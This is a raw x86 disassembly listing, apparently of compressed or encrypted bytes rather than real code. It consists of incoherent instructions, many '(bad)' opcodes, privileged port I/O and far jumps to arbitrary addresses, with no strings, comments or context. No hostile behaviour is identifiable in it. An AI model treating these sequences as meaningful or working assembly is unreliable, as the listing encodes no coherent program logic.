  417112:	test   al,0xa0
  417114:	add    bh,dh
  417116:	je     0x417125
  417118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417119:	jmp    0xe1e65255
  41711e:	scas   al,BYTE PTR es:[edi]
  41711f:	repz xor BYTE PTR ds:0x6ec9548d,0xb0
  417127:	sub    ch,BYTE PTR [ebx]
  417129:	mov    bl,0xe6
  41712b:	fbstp  TBYTE PTR [ecx-0x22]
  41712e:	inc    esp
  41712f:	sub    bl,BYTE PTR [eax-0x6b]
  417132:	int3   
  417133:	out    0x20,eax
  417135:	push   edi
  417136:	cs ins BYTE PTR es:[edi],dx
  417138:	sbb    eax,0x9769773a
  41713d:	stos   DWORD PTR es:[edi],eax
  41713e:	push   ecx
  41713f:	je     0x4171a0
  417141:	sub    cl,cl
  417143:	aas    
  417144:	add    al,0x5f
  417146:	lods   al,BYTE PTR ds:[esi]
  417147:	outs   dx,DWORD PTR ds:[esi]
  417148:	xchg   esi,eax
  417149:	into   
  41714a:	in     ax,dx
  41714c:	or     dh,dl
  41714e:	pop    ecx
  41714f:	mov    edi,0xde8b716f
  417154:	pop    es
  417155:	int3   
  417156:	and    edi,edi
  417158:	iret   
  417159:	xchg   edx,eax
  41715a:	jbe    0x4171d9
  41715c:	fs mov eax,0x4fee479b
  417162:	fwait
  417163:	loopne 0x41717f
  417165:	in     al,0x7e
  417167:	pop    ebp
  417168:	pop    eax
  417169:	xchg   ecx,eax
  41716a:	dec    ebp
  41716b:	jns    0x4171d9
  41716d:	int3   
  41716e:	(bad)  
  41716f:	mov    eax,ds:0x9e8672a
  417174:	cmp    al,BYTE PTR [esi+0x1bfa35af]
  41717a:	or     al,0x15
  41717c:	sub    eax,0x394af245
  417181:	out    dx,eax
  417182:	inc    ebx
  417183:	mov    bh,0x78
  417185:	stc    
  417186:	adc    ebp,edi
  417188:	pushf  
  417189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41718a:	mov    BYTE PTR [ebx+ebp*1+0x1427eb7d],bh
  417191:	loope  0x417136
  417193:	fs jae 0x4171fd
  417196:	sbb    DWORD PTR [ecx+0x195e9685],ecx
  41719c:	inc    DWORD PTR [ecx]
  41719e:	fsubr  QWORD PTR [ebx]
  4171a0:	jno    0x417183
  4171a2:	cmp    eax,0x49da3781
  4171a7:	and    BYTE PTR [ebp+0x56],dl
  4171aa:	xchg   edi,eax
  4171ab:	cwde   
  4171ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171ad:	call   0x8d65:0xf186b111
  4171b4:	xchg   ebx,eax
  4171b5:	(bad)  
  4171b6:	jle    0x417142
  4171b8:	mov    al,ds:0x9fadb15d
  4171bd:	and    edi,DWORD PTR [eax+0x2d]
  4171c0:	pushf  
  4171c1:	stos   DWORD PTR es:[edi],eax
  4171c2:	sbb    eax,DWORD PTR [ebp+0x39]
  4171c5:	sbb    BYTE PTR [ebx+0x3f7e96e9],al
  4171cb:	xchg   ecx,eax
  4171cc:	adc    DWORD PTR [edi],eax
  4171ce:	jmp    0x5898:0xd04a4831
  4171d5:	hlt    
  4171d6:	lea    esp,[edi-0x3]
  4171d9:	out    dx,eax
  4171da:	push   ebp
  4171db:	scas   al,BYTE PTR es:[edi]
  4171dc:	mov    bh,0x5d
  4171de:	stc    
  4171df:	mov    edx,0xc30484f1
  4171e4:	stos   DWORD PTR es:[edi],eax
  4171e5:	ror    DWORD PTR [ebp-0x332e5d2c],0xf2
  4171ec:	out    dx,al
  4171ed:	add    ebx,eax
  4171ef:	adc    ch,BYTE PTR [edx-0x69b9a954]
  4171f5:	sti    
  4171f6:	clc    
  4171f7:	icebp  
  4171f8:	mov    edx,esi
  4171fa:	dec    ebx
  4171fb:	push   ebp
  4171fc:	adc    eax,DWORD PTR [esi+0x1f]
  4171ff:	sbb    al,0xa2
  417201:	inc    ebx
  417202:	push   DWORD PTR [ecx+0x7e]
  417205:	xor    BYTE PTR [edi+ecx*1+0x408cf46e],ch
  41720c:	adc    BYTE PTR [ecx-0x3c1d130c],cl
  417212:	jbe    0x4171d1
  417214:	pop    ds
  417215:	aam    0x8a
  417217:	mov    WORD PTR [esi],?
  417219:	in     al,0xc3
  41721b:	mov    al,0xf4
  41721d:	in     al,0x49
  41721f:	and    al,0x4a
  417221:	leave  
  417222:	add    DWORD PTR [ecx-0x73],ebp
  417225:	jmp    0x313cfa1f
  41722a:	pop    ss
  41722b:	lahf   
  41722c:	test   eax,0xab3a657d
  417231:	dec    edi
  417232:	xor    DWORD PTR [eax+0x54],0xc0f1ffa5
  417239:	bound  esi,QWORD PTR [edx]
  41723b:	out    0x7f,al
  41723d:	shl    ah,0xf6
  417240:	pop    ebp
  417241:	scas   al,BYTE PTR es:[edi]
  417242:	pop    ss
  417243:	pop    esi
  417244:	repz xor al,0x32
  417247:	jge    0x417229
  417249:	jo     0x417209
  41724b:	repnz push esp
  41724d:	jne    0x4171d7
  41724f:	adc    ecx,DWORD PTR ds:0xd0e3b297
  417255:	imul   esp,DWORD PTR [esi+ebx*8-0x5a270bef],0xc015a4cb
  417260:	and    eax,0x70b13610
  417265:	jmp    0x3dff:0xb7b99ac6
  41726c:	xchg   esi,eax
  41726d:	cwde   
  41726e:	out    dx,al
  41726f:	add    DWORD PTR [edi],ebp
  417271:	or     ah,dh
  417273:	sub    ch,BYTE PTR [edi-0x7f7b0abd]
  417279:	out    dx,eax
  41727a:	or     ebp,eax
  41727c:	test   DWORD PTR [esi],0x4855cb28
  417282:	retf   
  417283:	ss rcl al,1
  417286:	test   esp,eax
  417288:	rol    DWORD PTR [ecx],cl
  41728a:	xor    eax,0xb925125e
  41728f:	xchg   ebp,eax
  417290:	test   DWORD PTR [eax],0x92a7bdcb
  417296:	fidivr DWORD PTR [edi+0x21]
  417299:	push   ebx
  41729a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41729b:	mov    ds:0x8867cf5d,eax
  4172a0:	jmp    0xcd4f7cb3
  4172a5:	xor    DWORD PTR [edi-0x3b95b9ee],esp
  4172ab:	shl    DWORD PTR [eax-0x1],cl
  4172ae:	pop    ss
  4172af:	xchg   esp,eax
  4172b0:	retf   
  4172b1:	ss jmp 0x49709291
  4172b7:	test   al,0x74
  4172b9:	pop    edi
  4172ba:	cs mov al,0x2
  4172bd:	xor    al,0xb1
  4172bf:	pop    eax
  4172c0:	sbb    DWORD PTR [ecx-0x5],0x6c342d97
  4172c7:	push   0x2e
  4172c9:	nop
  4172ca:	shl    edi,0x79
  4172cd:	dec    eax
  4172ce:	jle    0x4172ca
  4172d0:	inc    edi
  4172d1:	mov    esp,0x401a9963
  4172d6:	dec    ecx
  4172d7:	push   edi
  4172d8:	mov    ebp,0x567e3ca5
  4172dd:	pmulhw mm4,QWORD PTR [ebx+0x45fc83fa]
  4172e4:	jp     0x4172d8
  4172e6:	in     al,0x8f
  4172e8:	mov    cl,dl
  4172ea:	shr    BYTE PTR [eax-0x74d8ceb7],1
  4172f0:	dec    edx
  4172f1:	pop    ebp
  4172f2:	dec    ebp
  4172f3:	xchg   esp,eax
  4172f4:	cmp    esi,DWORD PTR [ebx+0x46]
  4172f7:	or     al,0xd6
  4172f9:	aas    
  4172fa:	inc    esi
  4172fb:	fild   DWORD PTR [eax+0x18]
  4172fe:	pop    esi
  4172ff:	out    0xf6,eax
  417301:	stc    
  417302:	push   0xb0d5efc8
  417307:	pop    ds
  417308:	jge    0x4172be
  41730a:	xor    eax,0x2d81e585
  41730f:	sbb    BYTE PTR [ecx+ebp*4],0x89
  417313:	pop    edi
  417314:	sbb    eax,0x22f7f4b6
  417319:	scas   al,BYTE PTR es:[edi]
  41731a:	inc    bl
  41731c:	add    BYTE PTR [eax],bl
  41731e:	jp     0x41738c
  417320:	xor    DWORD PTR [esi-0x7e],edx
  417323:	xchg   esp,eax
  417324:	pop    esi
  417325:	ds push ds
  417327:	sub    al,0x3
  417329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41732a:	xlat   BYTE PTR ds:[ebx]
  41732b:	(bad)  
  41732c:	aam    0x11
  41732e:	lds    ecx,FWORD PTR [edx+0x3d]
  417331:	ds mov esi,esi
  417334:	and    edi,esi
  417336:	mov    esp,0x2a36d90c
  41733b:	inc    esp
  41733c:	jmp    0x8b50f94e
  417341:	adc    ch,dh
  417343:	adc    DWORD PTR ds:0x4cdbf26b,esi
  417349:	cmp    BYTE PTR [ebx],cl
  41734b:	ins    BYTE PTR es:[edi],dx
  41734c:	and    BYTE PTR [esi-0x17],dl
  41734f:	mov    dh,0xe
  417351:	fadd   st(7),st
  417353:	dec    eax
  417354:	enter  0x4882,0x58
  417358:	shr    BYTE PTR [ebx-0x11],1
  41735b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41735c:	adc    BYTE PTR [edi],cl
  41735e:	cli    
  41735f:	gs ss in al,dx
  417362:	repnz mov edi,DWORD PTR [edx]
  417365:	fisttp WORD PTR [ebx+edx*1]
  417368:	loop   0x417304
  41736a:	in     al,0x7e
  41736c:	ret    
  41736d:	adc    bh,BYTE PTR [ebp-0x55]
  417370:	in     al,0x1f
  417372:	outs   dx,BYTE PTR ds:[esi]
  417373:	ja     0x417345
  417375:	inc    edx
  417376:	and    eax,DWORD PTR [eax+eiz*4-0x33]
  41737a:	fistp  WORD PTR [ebx]
  41737c:	je     0x417324
  41737e:	test   BYTE PTR [edi-0x7c],al
  417381:	aad    0xfb
  417383:	xor    eax,esi
  417385:	nop
  417386:	sub    DWORD PTR [ebx],ebx
  417388:	lds    eax,FWORD PTR [ebx-0x260ec6a2]
  41738e:	xlat   BYTE PTR ds:[ebx]
  41738f:	sub    dl,BYTE PTR [eax]
  417391:	dec    ecx
  417392:	cmp    bl,BYTE PTR [ebx-0x21]
  417395:	sbb    esi,DWORD PTR [esi-0x3911223f]
  41739b:	lock out 0xe2,al
  41739e:	dec    ebx
  41739f:	ror    DWORD PTR [edx],0x21
  4173a2:	(bad)  
  4173a3:	sbb    eax,0xfb75a710
  4173a8:	adc    BYTE PTR [esi],cl
  4173aa:	popf   
  4173ab:	fmul   st(5),st
  4173ad:	xor    BYTE PTR [ebx+ebx*8-0x2b017ae5],bh
  4173b4:	sbb    eax,0x24ad4041
  4173b9:	daa    
  4173ba:	dec    edx
  4173bb:	cmp    al,0xf3
  4173bd:	sub    al,0x9c
  4173bf:	dec    edi
  4173c0:	(bad)  
  4173c1:	and    eax,0x57bc01de
  4173c6:	dec    ebp
  4173c7:	je     0x417377
  4173c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ca:	jle    0x417446
  4173cc:	dec    ebx
  4173cd:	jae    0x417393
  4173cf:	popf   
  4173d0:	fist   DWORD PTR [esi+0x60]
  4173d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173d4:	cmp    eax,0x819917d0
  4173d9:	call   0xba2b:0xb016c9f1
  4173e0:	ss js  0x4173f0
  4173e3:	sbb    ch,BYTE PTR [ebx-0x4a]
  4173e6:	sbb    eax,DWORD PTR [eax]
  4173e8:	mov    ch,0x94
  4173ea:	sub    edx,ebx
  4173ec:	push   cs
  4173ed:	xchg   ebp,eax
  4173ee:	(bad)  
  4173ef:	mov    ah,0xd
  4173f1:	lods   al,BYTE PTR ds:[esi]
  4173f2:	repnz fs push 0x26
  4173f6:	adc    dl,dh
  4173f8:	sti    
  4173f9:	sub    eax,0xc673708
  4173fe:	inc    eax
  4173ff:	popf   
  417400:	xor    ecx,DWORD PTR [ebp-0x412d9cab]
  417406:	ret    
  417407:	in     eax,0xdf
  417409:	jo     0x4173a6
  41740b:	pusha  
  41740c:	aad    0x46
  41740e:	dec    esi
  41740f:	xchg   edi,eax
  417410:	and    al,0x3
  417412:	enter  0x2519,0x73
  417416:	call   DWORD PTR [edi-0xa4ee91e]
  41741c:	mov    ebx,0x4b6f402c
  417421:	jb     0x4173e8
  417423:	xor    BYTE PTR [ebx+0x44868dcd],bl
  417429:	int    0x8e
  41742b:	in     al,dx
  41742c:	jmp    0x417453
  41742e:	pop    ss
  41742f:	jl     0x4173b6
  417431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417432:	push   ebp
  417433:	push   ds
  417434:	push   es
  417435:	clc    
  417436:	push   ecx
  417437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417438:	pop    edi
  417439:	arpl   WORD PTR [ebx],bx
  41743b:	enter  0xee55,0x61
  41743f:	sahf   
  417440:	jbe    0x417402
  417442:	test   DWORD PTR [ecx],ebx
  417444:	data16 jne 0x417496
  417447:	aas    
  417448:	ins    DWORD PTR es:[edi],dx
  417449:	mov    dh,0x46
  41744b:	dec    ecx
  41744c:	mov    ds:0x922aa040,eax
  417451:	aam    0xb1
  417453:	stos   BYTE PTR es:[edi],al
  417454:	inc    esp
  417455:	inc    eax
  417456:	scas   eax,DWORD PTR es:[edi]
  417457:	mov    eax,ds:0xf26d9b9d
  41745c:	into   
  41745d:	push   ds
  41745e:	and    eax,0x1672df98
  417463:	mov    al,0x52
  417465:	test   DWORD PTR [eax],esi
  417467:	jl     0x41741a
  417469:	stos   BYTE PTR es:[edi],al
  41746a:	dec    ebp
  41746b:	cmp    al,0x3e
  41746d:	jae    0x41749d
  41746f:	push   edx
  417470:	fsubp  st(0),st
  417472:	dec    ebx
  417473:	mov    esi,0x5d304fe6
  417478:	cli    
  417479:	pop    edi
  41747a:	inc    edi
  41747c:	or     DWORD PTR [esi-0x3a],esi
  41747f:	xor    BYTE PTR [esi*2-0x72776c9a],bl
  417486:	mov    cl,0x87
  417488:	repz out dx,eax
  41748a:	mov    ecx,0xacb8d4c9
  41748f:	enter  0x541d,0x1a
  417493:	shrd   DWORD PTR [edi+edi*1+0x504e6e09],esp,0x6b
  41749c:	fs pop edx
  41749f:	test   BYTE PTR [edi-0x83ef55],ah
  4174a5:	mov    gs,WORD PTR [edx]
  4174a7:	add    al,0xfb
  4174a9:	ds clc 
  4174ab:	and    ah,BYTE PTR [edi-0x10]
  4174ae:	aas    
  4174af:	and    al,BYTE PTR [eax+0x76]
  4174b2:	cmp    al,0xf
  4174b4:	mov    dl,0x84
  4174b6:	ds ret 
  4174b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174b9:	mov    ebp,0x8c60403a
  4174be:	fadd   st,st(7)
  4174c0:	xchg   DWORD PTR [eax-0x73],eax
  4174c3:	lods   al,BYTE PTR ds:[esi]
  4174c4:	ds push cs
  4174c6:	outs   dx,DWORD PTR ds:[esi]
  4174c7:	test   BYTE PTR [ebx-0x68],ch
  4174ca:	xchg   ebp,eax
  4174cb:	mov    ah,0xd2
  4174cd:	ret    
  4174ce:	add    ebx,DWORD PTR [ebx+0x1ea44ac]
  4174d4:	loopne 0x4174c5
  4174d6:	cmc    
  4174d7:	jb     0x4174c7
  4174d9:	nop
  4174da:	sub    esp,DWORD PTR [edi-0xddceba]
  4174e0:	jge    0x41749b
  4174e2:	sub    edx,edi
  4174e4:	mov    eax,0x337a07c2
  4174e9:	ja     0x417471
  4174eb:	push   es
  4174ec:	xchg   esi,eax
  4174ed:	test   BYTE PTR [esp+ebx*1],dl
  4174f0:	sbb    BYTE PTR [edx],al
  4174f2:	inc    edi
  4174f3:	fist   WORD PTR [esi+edi*1+0x1b14c5bf]
  4174fa:	cmp    BYTE PTR [edi+0x1f],al
  4174fd:	sub    BYTE PTR [ebx+0x2b],ch
  417500:	dec    edx
  417501:	outs   dx,DWORD PTR ds:[esi]
  417502:	clc    
  417503:	ja     0x417583
  417505:	dec    DWORD PTR [ebx]
  417507:	adc    al,0x6f
  417509:	lods   al,BYTE PTR ds:[esi]
  41750a:	lea    ebx,[ebx-0x5b]
  41750d:	hlt    
  41750e:	pop    ss
  41750f:	xor    BYTE PTR [ebp-0x55244969],ah
  417515:	cmp    al,0x10
  417517:	dec    ebx
  417518:	test   al,0x6c
  41751a:	dec    ebp
  41751b:	iret   
  41751c:	in     eax,dx
  41751d:	(bad)  
  41751e:	xchg   edi,eax
  41751f:	mov    edi,0x3c0ae49
  417524:	stos   DWORD PTR es:[edi],eax
  417525:	addr16 xchg ecx,eax
  417527:	pop    es
  417528:	invd   
  41752a:	shr    DWORD PTR [edi],0x7f
  41752d:	aaa    
  41752e:	sbb    DWORD PTR [eax],ebp
  417530:	adc    al,0xb7
  417532:	mov    ch,0xd1
  417534:	add    DWORD PTR [eax-0x405cc1ce],ecx
  41753a:	sbb    ebp,DWORD PTR [ebx+ebx*2-0x62531dd3]
  417541:	lods   al,BYTE PTR ds:[esi]
  417542:	mov    ebp,DWORD PTR [ebx-0x7141e99d]
  417548:	push   ds
  417549:	xchg   ebp,eax
  41754a:	jp     0x4175c9
  41754c:	jmp    0x1ad9c414
  417551:	xor    eax,0x3178ecb7
  417556:	or     cl,BYTE PTR [ebx+esi*4]
  417559:	sub    al,BYTE PTR [eax+ebx*2-0x57]
  41755d:	enter  0x7adc,0x1c
  417561:	mov    eax,0x1811f03d
  417566:	je     0x417578
  417568:	push   es
  417569:	dec    esi
  41756a:	aad    0xc4
  41756c:	or     ebx,esi
  41756e:	fwait
  41756f:	xchg   edx,eax
  417570:	aam    0xd6
  417572:	dec    edi
  417573:	add    DWORD PTR [edx-0x39],esp
  417576:	call   0x6634:0x884c5ecd
  41757d:	fiadd  DWORD PTR [edx+0x34]
  417580:	enter  0xf799,0x69
  417584:	imul   ecx,DWORD PTR [edx+ebx*8-0x7a509903],0xffffff86
  41758c:	push   0xffffffa5
  41758e:	push   0x4035e64
  417593:	inc    DWORD PTR [edi]
  417595:	rcr    cl,0x80
  417598:	add    DWORD PTR [ecx-0x19],esp
  41759b:	lods   al,BYTE PTR ds:[esi]
  41759c:	mov    ebx,0x963c9749
  4175a1:	arpl   WORD PTR [ebx+0xfe2a6cf],sp
  4175a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a8:	inc    eax
  4175a9:	push   edx
  4175aa:	mov    al,0x64
  4175ac:	nop
  4175ad:	push   eax
  4175ae:	ret    0x443a
  4175b1:	pop    esi
  4175b2:	in     eax,0xd2
  4175b4:	sbb    eax,0xd55d070d
  4175b9:	cmp    dl,dh
  4175bb:	aaa    
  4175bc:	jecxz  0x4175b7
  4175be:	xor    DWORD PTR [esi],ecx
  4175c0:	scas   al,BYTE PTR es:[edi]
  4175c1:	inc    esi
  4175c2:	call   0x7b4e:0x8e1b2b58
  4175c9:	fsub   st(4),st
  4175cb:	ss jge 0x4175db
  4175ce:	xchg   edx,eax
  4175cf:	ins    BYTE PTR es:[edi],dx
  4175d0:	ins    BYTE PTR es:[edi],dx
  4175d1:	xchg   edx,eax
  4175d2:	bound  esi,QWORD PTR [ecx]
  4175d4:	xchg   esi,eax
  4175d5:	test   al,0x74
  4175d7:	push   ebp
  4175d8:	push   ebx
  4175d9:	pusha  
  4175da:	xor    eax,0x5efb1306
  4175df:	jo     0x417582
  4175e1:	in     eax,dx
  4175e2:	xchg   esp,eax
  4175e3:	pop    eax
  4175e4:	leave  
  4175e5:	fadd   QWORD PTR [ecx+0x536ca301]
  4175eb:	adc    DWORD PTR [edi+0x3023d71f],esp
  4175f1:	outs   dx,DWORD PTR ds:[esi]
  4175f2:	aas    
  4175f3:	xchg   ebp,eax
  4175f4:	or     ebx,esi
  4175f6:	cmp    esp,DWORD PTR [esi+0x3f]
  4175f9:	add    DWORD PTR [eax+0x6ef84a61],ebx
  4175ff:	test   al,0xde
  417601:	aas    
  417602:	pop    ss
  417603:	pop    esi
  417604:	xor    DWORD PTR [edx+0x6],0x66
  417608:	fwait
  417609:	dec    ebp
  41760a:	pop    esi
  41760b:	fcomp  DWORD PTR [esi+0x69c89a0a]
  417611:	cmp    eax,0x3f239695
  417616:	jbe    0x4175bd
  417618:	push   ebp
  417619:	pop    ebp
  41761a:	cmp    esp,DWORD PTR [ecx]
  41761c:	(bad)  [eax+0x1d2aba52]
  417622:	in     al,dx
  417623:	shl    edi,0xd7
  417626:	aas    
  417627:	add    eax,0xb4790d78
  41762c:	push   ebx
  41762d:	aam    0x34
  41762f:	jg     0x41768f
  417631:	popa   
  417632:	cmp    al,0xa3
  417634:	jns    0x4175d1
  417636:	int    0xef
  417638:	jae    0x417639
  41763a:	mov    ds:0x836f17c3,al
  41763f:	or     al,0x6e
  417641:	mov    eax,0xbccc6c48
  417646:	sub    eax,0x9954994f
  41764b:	jmp    0x4176bd
  41764d:	mov    dl,0x24
  41764f:	and    BYTE PTR [edx-0x68],cl
  417652:	dec    ebx
  417653:	sahf   
  417654:	aaa    
  417655:	sub    bl,BYTE PTR [edi]
  417657:	inc    ebp
  417658:	and    al,0x84
  41765a:	mov    ds:0xfd3426d6,al
  41765f:	(bad)  
  417660:	xchg   ebp,eax
  417661:	xlat   BYTE PTR ds:[ebx]
  417662:	xchg   edx,eax
  417663:	fstp   QWORD PTR [ecx+0x7ee31535]
  417669:	fidivr DWORD PTR [edx]
  41766b:	sub    eax,DWORD PTR [eax]
  41766d:	dec    edi
  41766e:	fcom   QWORD PTR ds:0x644b3b9e
  417674:	fadd   QWORD PTR [ebx+0x7d1dc288]
  41767a:	push   esi
  41767b:	sub    BYTE PTR [edx+ecx*8],cl
  41767e:	call   0xd0e0:0x75e5fe19
  417685:	fucomip st,st(7)
  417687:	add    eax,0x4f975ffa
  41768c:	inc    esp
  41768d:	test   BYTE PTR [esi-0x215642d1],ah
  417693:	mov    ecx,0x6e642756
  417698:	jg     0x4176f4
  41769a:	jl     0x417668
  41769c:	or     BYTE PTR [ebp+0x70],bl
  41769f:	pop    es
  4176a0:	push   esi
  4176a1:	jl     0x4176c1
  4176a3:	es push ebx
  4176a5:	mov    eax,0xe13428e3
  4176aa:	pusha  
  4176ab:	inc    ebx
  4176ac:	icebp  
  4176ad:	xchg   edx,eax
  4176ae:	adc    DWORD PTR [esi+0x3c],ebp
  4176b1:	cmp    DWORD PTR [ebx+0x7a],edx
  4176b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b5:	rol    BYTE PTR [ecx-0x20],1
  4176b8:	push   ss
  4176b9:	inc    ebp
  4176ba:	push   esi
  4176bb:	add    edx,DWORD PTR ds:0x5d1c176a
  4176c1:	mov    ds:0xd17d9032,eax
  4176c6:	cli    
  4176c7:	ja     0x41764f
  4176c9:	lds    ecx,FWORD PTR [edx-0x405e3208]
  4176cf:	sbb    bl,bh
  4176d1:	stos   BYTE PTR es:[edi],al
  4176d2:	add    ebp,edi
  4176d4:	scas   eax,DWORD PTR es:[edi]
  4176d5:	stc    
  4176d6:	aad    0x8
  4176d8:	inc    edx
  4176d9:	mov    al,ds:0xe177cacd
  4176de:	ins    DWORD PTR es:[edi],dx
  4176df:	pop    eax
  4176e0:	scas   al,BYTE PTR es:[edi]
  4176e1:	jbe    0x417674
  4176e3:	inc    esp
  4176e4:	xor    DWORD PTR [esi+0x6f],ebx
  4176e7:	jmp    0x417671
  4176e9:	cwde   
  4176ea:	(bad)  
  4176ec:	xchg   edx,eax
  4176ed:	xchg   esp,eax
  4176ee:	pop    eax
  4176ef:	js     0x41772a
  4176f1:	out    0x34,al
  4176f3:	ins    BYTE PTR es:[edi],dx
  4176f4:	jmp    0xf38a6da0
  4176f9:	repz pop eax
  4176fb:	pop    eax
  4176fc:	das    
  4176fd:	xor    ch,BYTE PTR [ebp-0x1ff7ffd]
  417703:	jnp    0x4176e1
  417705:	adc    edx,edi
  417707:	jmp    0xf2cf:0x8ce2ce32
  41770e:	mov    edi,0xe152873b
  417713:	aam    0x53
  417715:	or     DWORD PTR [ebx],edi
  417717:	bound  esi,QWORD PTR [ecx+0x23]
  41771a:	shl    esi,cl
  41771c:	fiadd  WORD PTR [ebp+0x2e75b2cf]
  417722:	push   0x5002773e
  417727:	mov    ch,0x42
  417729:	out    dx,al
  41772a:	xchg   esp,eax
  41772b:	sbb    DWORD PTR [ebp-0x41c044d3],edi
  417731:	ret    
  417732:	stos   BYTE PTR es:[edi],al
  417733:	xor    esi,ebp
  417735:	adc    al,0x7e
  417737:	jp     0x41770b
  417739:	xchg   edi,eax
  41773a:	jne    0x4176fc
  41773c:	jg     0x41779d
  41773e:	ss cdq 
  417740:	sbb    ebp,eax
  417742:	dec    esi
  417743:	mov    esi,0x104430b
  417748:	sbb    al,0x4b
  41774a:	push   ebp
  41774b:	cmc    
  41774c:	loopne 0x417739
  41774e:	daa    
  41774f:	jmp    0x4c6f4b5b
  417754:	add    ebx,eax
  417756:	mov    eax,0x22c736fa
  41775b:	xchg   ecx,eax
  41775c:	push   eax
  41775d:	pop    ds
  41775e:	iret   
  41775f:	inc    ebp
  417760:	imul   edi,DWORD PTR ds:0xb5b57d6c,0x3adf4baf
  41776a:	pop    eax
  41776b:	fadd   QWORD PTR [edx]
  41776d:	dec    edx
  41776e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41776f:	setae  BYTE PTR [ecx]
  417772:	cmp    al,0x51
  417774:	jne    0x41778d
  417776:	mov    ecx,0xd18124bc
  41777b:	mov    al,0x7e
  41777d:	sbb    DWORD PTR [eax],esi
  41777f:	scas   eax,DWORD PTR es:[edi]
  417780:	out    dx,eax
  417781:	mov    bh,0x1d
  417783:	cdq    
  417784:	dec    esp
  417785:	xlat   BYTE PTR ds:[ebx]
  417786:	gs sbb esi,eax
  417789:	xchg   edi,eax
  41778a:	dec    edi
  41778b:	call   0xe02d:0xb835
  417791:	cmp    al,0xc2
  417793:	dec    eax
  417794:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417796:	inc    ebp
  417797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417798:	jne    0x41771a
  41779a:	mov    edi,0x87e069ff
  41779f:	push   cs
  4177a0:	stos   BYTE PTR es:[edi],al
  4177a1:	pusha  
  4177a2:	and    al,0x9c
  4177a4:	(bad)  [edx+0x7f]
  4177a7:	and    al,0xae
  4177a9:	push   es
  4177aa:	dec    edi
  4177ab:	cdq    
  4177ac:	add    dl,BYTE PTR [eax+0x11]
  4177af:	cmp    al,0xf2
  4177b1:	aad    0xc5
  4177b3:	inc    ebp
  4177b4:	xchg   eax,edx
  4177b6:	mov    ch,0x9a
  4177b8:	scas   eax,DWORD PTR es:[edi]
  4177b9:	jnp    0x4177b1
  4177bb:	dec    esp
  4177bc:	test   DWORD PTR [esi],esp
  4177be:	outs   dx,BYTE PTR ds:[esi]
  4177bf:	mov    ecx,0xfce06240
  4177c4:	in     eax,0xa
  4177c6:	stos   BYTE PTR es:[edi],al
  4177c7:	dec    ecx
  4177c8:	xchg   edi,eax
  4177c9:	and    eax,0xa1abf9e4
  4177ce:	inc    ebp
  4177cf:	push   0xffffff92
  4177d1:	push   ecx
  4177d2:	add    ax,di
  4177d5:	aad    0x2d
  4177d7:	out    dx,al
  4177d8:	out    dx,eax
  4177d9:	shl    DWORD PTR [eax+ebp*8-0x34],0x59
  4177de:	mov    edi,0xb57a3a95
  4177e3:	out    0x6,al
  4177e5:	inc    DWORD PTR [esi-0x50]
  4177e8:	mov    edx,0x40f66e97
  4177ed:	or     bh,BYTE PTR [edx+0x3c9fa399]
  4177f3:	dec    ecx
  4177f4:	jo     0x417875
  4177f6:	(bad)  
  4177f7:	stos   DWORD PTR es:[edi],eax
  4177f8:	xlat   BYTE PTR ds:[ebx]
  4177f9:	sub    dh,BYTE PTR [edi]
  4177fb:	in     al,0x69
  4177fd:	pushf  
  4177fe:	fimul  WORD PTR [esi+edi*2]
  417801:	sbb    al,0x26
  417803:	jo     0x417871
  417805:	imul   edi,DWORD PTR [eax-0x6c],0x129c3e66
  41780c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41780d:	adc    al,0x3f
  41780f:	mov    ebx,DWORD PTR [esi+0x382139ed]
  417815:	lock xchg esp,eax
  417817:	mov    dh,0x8d
  417819:	mov    eax,0x2bbfb5af
  41781e:	push   edi
  41781f:	test   DWORD PTR [ebx-0x2d0e7f24],ecx
  417825:	scas   al,BYTE PTR es:[edi]
  417826:	mov    ecx,0x294e1220
  41782b:	xor    al,0x19
  41782d:	pop    ds
  41782e:	sar    BYTE PTR [ebp-0x151c7fe4],cl
  417834:	cmp    dh,BYTE PTR [eax+0x567ba15a]
  41783a:	dec    ecx
  41783b:	push   es
  41783c:	sub    BYTE PTR [esi-0x76810f40],bl
  417842:	mov    ch,0xd2
  417844:	jbe    0x417867
  417846:	mov    eax,ds:0xc9b9a079
  41784b:	and    al,0x8f
  41784d:	dec    edi
  41784e:	mov    ebx,0x68859b9e
  417853:	and    bl,cl
  417855:	sbb    BYTE PTR [edx],0xff
  417858:	call   0xe2b55a55
  41785d:	stos   BYTE PTR es:[edi],al
  41785e:	pop    ecx
  41785f:	xlat   BYTE PTR ds:[ebx]
  417860:	retf   
  417861:	push   ebx
  417862:	inc    esi
  417863:	sti    
  417864:	into   
  417865:	mov    ebp,0x581488d9
  41786a:	fadd   QWORD PTR [ebx-0x9]
  41786d:	pop    es
  41786e:	and    bh,BYTE PTR [esi-0x4f]
  417871:	pop    ebx
  417872:	ja     0x417887
  417874:	pop    ds
  417875:	jno    0x4178e0
  417877:	jb     0x4178d0
  417879:	out    0x3a,al
  41787b:	xor    dl,BYTE PTR [edx+0x5b]
  41787e:	dec    edi
  41787f:	add    al,BYTE PTR [ebx]
  417881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417882:	das    
  417883:	lds    esi,FWORD PTR [esi]
  417885:	call   0x893436d3
  41788a:	jmp    0xdb7c:0x9b88db81
  417891:	ret    0x5482
  417894:	xlat   BYTE PTR ds:[ebx]
  417895:	push   0xffffffa4
  417897:	pop    esp
  417898:	inc    edi
